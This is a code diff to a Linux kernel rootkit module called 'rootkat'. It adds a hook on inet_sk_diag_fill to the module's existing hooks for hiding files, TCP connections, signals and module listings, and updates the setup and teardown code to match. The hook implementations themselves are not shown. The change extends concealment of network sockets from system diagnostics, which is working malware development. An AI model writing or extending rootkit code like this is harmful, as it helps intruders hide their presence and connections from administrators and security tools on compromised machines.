@@ -9,6 +9,7 @@
 #include "hook_filldir64.h"
 #include "hook_tcp4_seq_show.h"
 #include "hook_tcp6_seq_show.h"
+#include "hook_inet_sk_diag_fill.h"
 
 #define ROOTKAT_TAG "rootkat: "
 
@@ -64,12 +65,24 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
+	rc = rootkat_hook_inet_sk_diag_fill_install();
+	if (rc) {
+		pr_err(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d\n", rc);
+		rootkat_hook_tcp6_seq_show_remove();
+		rootkat_hook_tcp4_seq_show_remove();
+		rootkat_hook_filldir64_remove();
+		rootkat_hook_sys_kill_remove();
+		rootkat_hook_m_show_remove();
+		return rc;
+	}
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_inet_sk_diag_fill_remove();
 	rootkat_hook_tcp6_seq_show_remove();
 	rootkat_hook_tcp4_seq_show_remove();
 	rootkat_hook_filldir64_remove();
